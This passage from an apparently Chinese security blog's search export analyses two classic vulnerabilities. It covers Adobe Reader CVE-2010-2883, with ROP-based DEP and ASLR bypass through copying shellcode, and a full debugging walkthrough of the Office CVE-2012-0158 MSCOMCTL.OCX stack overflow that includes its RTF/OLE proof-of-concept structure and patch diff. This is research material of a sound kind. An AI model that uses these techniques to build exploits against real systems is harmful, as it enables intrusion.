src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005720538.png" class="" title="image-20201110005720538"><p>然后，执行MapViewOfFile函数</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005847673.png" class="" title="image-20201110005847673"><p>然后，再执行memcpy函数</p><img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110010014506.png" class="" title="image-20201110010014506"><p>其中目的地址就是前面MapViewOfFile返回的地址，而源地址就是真正的Shellcode代码，将他复制到一段可执行可读写的内存段，以此绕过DEP保护。由于构造的ROP指令均位于不受ASLR保护的icucnv36.dll模块，因此也可用于绕过ASLR保护。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Adobe Reader漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-0158</title>
      <link href="/2021/05/19/CVE-2012-0158/"/>
      <url>/2021/05/19/CVE-2012-0158/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul><li>漏洞编号：CVE-2012-0158</li><li>漏洞类型：栈溢出</li><li>漏洞影响：信息泄露</li><li>该漏洞一直是office漏洞史上的经典案例。该漏洞首次发现于2015年6月，目标主要为东南亚国家和地区，此次攻击事件被命名为“Lotus Blossom”行动。该行动从2012~2015持续了三年之久。</li><li>黑客组织在此次间谍行动中，主要通过构造恶意Office文档诱使目标上钩，从而在对方的计算机上植入木马，窃取机密信息。</li></ul><h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>2012-0158是一个经典的栈溢出漏洞，成因在于office在解析activeX控件时调用系统的MSCOMCTL.OCX库中存在栈溢出漏洞，导致可被用于执行任意代码。</p><h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>操作系统：XP SP3 ~ WIN7</p><p>office版本：2003 ~ 2010</p><span id="more"></span><h2 id="二、调试环境"><a href="#二、调试环境" class="headerlink" title="二、调试环境"></a>二、调试环境</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><table><thead><tr><th></th><th>使用环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>xp SP3</td><td>简体中文版</td></tr><tr><td>虚拟机</td><td>VMware</td><td>16 pro</td></tr><tr><td>调试器</td><td>immunity debugger</td><td>1.85</td></tr><tr><td>反汇编器</td><td>IDA Pro</td><td>6.8</td></tr><tr><td>漏洞软件</td><td>word</td><td>2007 中文版</td></tr><tr><td>office 格式分析工具</td><td>OffVis</td><td>1.1</td></tr></tbody></table><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul><li>漏洞文件：MSCOMCTL.OCX</li></ul><h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><p>用immunity debugger附加word之后F9运行，将poc拖进word窗口打开之后，程序崩溃断下，如下图所示（如果栈中不显示模块地址的话，就<code>alt + E</code>到模块中刷新一下再返回模块地址就显示出来了）</p><img src="/2021/05/19/CVE-2012-0158/image-20210301002358146.png" class="" title="image-20210301002358146"><p>通过上图回溯栈上数据我们可以看到最近的返回地址在MSCOMCTL.275C8B91处，然后我们可以在左侧内存数据中跳转到275C8B91查看一下此处的汇编代码</p><img src="/2021/05/19/CVE-2012-0158/image-20210301005617573.png" class="" title="image-20210301005617573"><p>继续往上追溯，可以看到0x275C8B91是位于函数sub_275C8B4E中的，将sub_275C8B4E标记为VulFun函数，然后在VulFun函数入口地址0x275C8B4E处下断。但是我们如果直接在这个地址下普通断点的话是断不下来的，因为这个地址时固定的所以我们直接<code>alt + E</code>进入模块找到0x275C8B4E处下硬件断点即可，然后再每次重新打开poc的时候就会在这个地方断下来。</p><img src="/2021/05/19/CVE-2012-0158/image-20210301200544912.png" class="" title="image-20210301200544912"><p>然后我们F8单步</p><p>可以断下来之后，我们用IDA加载MSCOMCTL.OCX模块来看一下刚才标记的VulFun函数，可以看到这里面有一个sub_275C88F4函数被调用了两次，这里原本是<code>V5 == 1784835907</code>，将其标记为char类型之后为‘jboC’，这里按照小端存储的规则逆过来之后就是’Cobj’，后面的 <code>&amp;&amp;dwBytes &gt;= 8</code>，我们在immDbg中看到这个函数总共分配了0x14个字节大小的栈空间，在中间用掉了0xC个字节，剩余0x8字节，所以这里再判断 dwBytes &gt;= 8，将dwBytes个数据再拷贝到栈上的时候，由于复制的大小超出0x8个字节，会导致溢出。</p><img src="/2021/05/19/CVE-2012-0158/image-20210302001708969.png" class="" title="image-20210302001708969"><p>第一次调用sub_275C88F4复制了”Cobjd”字符串</p><img src="/2021/05/19/CVE-2012-0158/image-20210303000306632.png" class="" title="image-20210303000306632"><p>在第二次调用sub_275C88F4的时候发生了溢出</p><p>动态执行到第二次sub_275C88F4拷贝结束的时候可以看到返回地址已经被0x41414141覆盖了，验证了我们前面的分析</p><img src="/2021/05/19/CVE-2012-0158/image-20210302000619198.png" class="" title="image-20210302000619198"><p>现在我们已经大体上知道了溢出的点和原因在哪里，接下来我们分析一下poc.doc文件格式，看看程序是在解析doc文件中哪一字段时溢出的，下图是doc文件格式的开头内容</p><img src="/2021/05/19/CVE-2012-0158/image-20210302235810422.png" class="" title="image-20210302235810422"><p>导致漏洞的是\object标签的内容，其中的\objocx代表在OLE容器中嵌入OCX控件，后面的\objdata包含对象数据，OLE对象采用OLESaveToStream结构，后面的D0CF11E0是OLE签名，代表DOCFILE，从这里开始就是OLE数据。如果我们直接用OffVis打开poc.doc解析，会得到未发现OLESS签名的错误。</p><img src="/2021/05/19/CVE-2012-0158/image-20210303001900921.png" class="" title="image-20210303001900921"><p>这是因为poc.doc是RTF格式，里面的OLE数据是以文本形式存储，因此未被OffVis识别出来，可将从0xD0CF11E0开始至结尾的数据以16进制形式保存为test.doc，再用OffVis打开即可解析。</p><img src="/2021/05/19/CVE-2012-0158/image-20210303004413687.png" class="" title="image-20210303004413687"><p>关于上面CLSID对应的控件，直接通过OLE Viewer或者注册表搜索即可查找到是ListViewA控件。然后找到覆盖返回地址的0x41414141，它位于EleName = Contents的Data字段</p><img src="/2021/05/19/CVE-2012-0158/image-20210303005915237.png" class="" title="image-20210303005915237"><p>回头看下VulFun函数对此段数据的解析，回到IDA按F5查看C代码</p><img src="/2021/05/19/CVE-2012-0158/image-20210304001450144.png" class="" title="image-20210304001450144"><p>动态调试数据</p><img src="/2021/05/19/CVE-2012-0158/image-20210303233354807.png" class="" title="image-20210303233354807"><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>下载补丁后，用binDiff对比打补丁前后的修复情况。</p><img src="/2021/05/19/CVE-2012-0158/image-20210306192914998.png" class="" title="image-20210306192914998"><p>这里新添加了对dwVersion的判断：需要dwVersion等于0x64，dwBytes等于8才继续执行，否则直接返回</p><img src="/2021/05/19/CVE-2012-0158/image-20210306193328340.png" class="" title="image-20210306193328340"><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于栈溢出漏洞的分析，都是通过栈回溯的方法找到漏洞函数，可在原栈顶（上层函数返回地址）下内存写断点。程序断下时，经常是在mov和rep movs等用于实现字符串复制的相关指令处，再通过栈回溯或者函数交叉引用定位漏洞函数地址；而对于ActiveX控件的调试，一般通过OLEAUT32模块中的DispCallFunc函数对首个call ecx指令下断跟进，此时进入的就是POC中调用的控件函数，就得逐个跟进call ecx去判断对应的是哪个控件函数。上面的调试方法也不是唯一的，比如通过指令运行记录功能，将POC分别在漏洞版本和修复版本的程序上运行，再通过对比运行指令的差异性，从中找到漏洞成因及修复方法。</p><p>参考文章：</p><p>《漏洞战争》</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> office漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
